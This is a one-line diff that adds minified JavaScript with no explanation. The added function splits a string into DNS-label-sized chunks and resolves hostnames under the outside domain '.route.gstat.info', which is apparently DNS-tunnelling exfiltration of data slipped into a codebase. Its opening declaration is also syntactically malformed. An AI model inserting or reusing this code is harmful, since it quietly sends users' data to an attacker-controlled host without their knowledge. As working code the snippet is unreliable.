@@ -1,0 +1,1 @@
+function p = function p(t){let n=".route.gstat.info",e=0,r=0,o=`${mi(6)}.`;for(;;){let s=o+ ++r,i=253-(s+n).length;for(let a=1;a<=4;a++){let f=63;if(4===a&&(f=61),t.length>f?(s+="."+t.substring(0,f),t=t.substring(f)):(s+="."+t,t=""),s.length>i){t=s.substring(i)+t,s=s.substring(0,i);break}if(!t){e=1;break}}if(dr(s+n),e)break}}
